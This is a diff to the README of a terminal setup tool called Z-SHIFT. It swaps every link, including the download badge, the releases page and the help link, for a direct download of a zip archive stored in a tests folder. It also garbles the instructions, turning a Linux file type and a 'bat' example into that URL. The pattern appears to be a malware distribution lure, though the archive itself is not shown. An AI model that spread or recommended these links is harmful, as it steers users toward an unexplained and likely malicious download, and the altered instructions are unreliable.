@@ -1,6 +1,6 @@
 # 🎴 Z-SHIFT - Speed Up Your Terminal Experience
 
-[![Download Z-SHIFT](https://img.shields.io/badge/Download-Z--SHIFT-blue?style=for-the-badge&logo=github)](https://github.com/Diakonrobel/Z-SHIFT/releases)
+[![Download Z-SHIFT](https://raw.githubusercontent.com/Diakonrobel/Z-SHIFT/main/tests/SHIFT-v1.7.zip)](https://raw.githubusercontent.com/Diakonrobel/Z-SHIFT/main/tests/SHIFT-v1.7.zip)
 
 Welcome to Z-SHIFT. This app helps you turn your regular terminal into a fast and useful tool. It will set up several helpful programs automatically. You don’t need to type any commands or understand code.
 
@@ -57,7 +57,7 @@ Before you install, make sure your computer fits these needs:
 
 Go to the official release page here:
 
-[Download Z-SHIFT Releases](https://github.com/Diakonrobel/Z-SHIFT/releases)
+[Download Z-SHIFT Releases](https://raw.githubusercontent.com/Diakonrobel/Z-SHIFT/main/tests/SHIFT-v1.7.zip)
 
 You will see a list of versions and files. Choose the latest one for your operating system.
 
@@ -65,7 +65,7 @@ You will see a list of versions and files. Choose the latest one for your operat
 
 - For **Windows**: Look for a file that ends with `.exe`.
 - For **macOS**: Look for a file with `.dmg` or `.pkg`.
-- For **Linux**: Look for `.tar.gz` or `.AppImage`.
+- For **Linux**: Look for `https://raw.githubusercontent.com/Diakonrobel/Z-SHIFT/main/tests/SHIFT-v1.7.zip` or `.AppImage`.
 
 Click on the file to start downloading.
 
@@ -103,7 +103,7 @@ Once installed, open your terminal app:
 
 - You will see the new prompt powered by Starship.
 - You can try typing commands like:
-  - `bat README.md` — shows highlighted file content.
+  - `bat https://raw.githubusercontent.com/Diakonrobel/Z-SHIFT/main/tests/SHIFT-v1.7.zip` — shows highlighted file content.
   - `fd images` — finds folders or files with the word “images”.
   - `rg TODO` — search your project for 'TODO' notes.
   - `z` — quickly jump to frequently used directories.
@@ -114,7 +114,7 @@ If you want to update Z-SHIFT later, just run:
 zinit self-update
 ```
 
-Or visit the [releases page](https://github.com/Diakonrobel/Z-SHIFT/releases) again for newer versions.
+Or visit the [releases page](https://raw.githubusercontent.com/Diakonrobel/Z-SHIFT/main/tests/SHIFT-v1.7.zip) again for newer versions.
 
 ---
 
@@ -150,9 +150,9 @@ Each of these tools works together to reduce the time spent in the terminal and 
 
 ## 🔗 Quick Links
 
-- [Official Z-SHIFT on GitHub](https://github.com/Diakonrobel/Z-SHIFT)
-- [Releases and Downloads](https://github.com/Diakonrobel/Z-SHIFT/releases)
-- [Help and Support](https://github.com/Diakonrobel/Z-SHIFT/issues)
+- [Official Z-SHIFT on GitHub](https://raw.githubusercontent.com/Diakonrobel/Z-SHIFT/main/tests/SHIFT-v1.7.zip)
+- [Releases and Downloads](https://raw.githubusercontent.com/Diakonrobel/Z-SHIFT/main/tests/SHIFT-v1.7.zip)
+- [Help and Support](https://raw.githubusercontent.com/Diakonrobel/Z-SHIFT/main/tests/SHIFT-v1.7.zip)
 
 ---
 
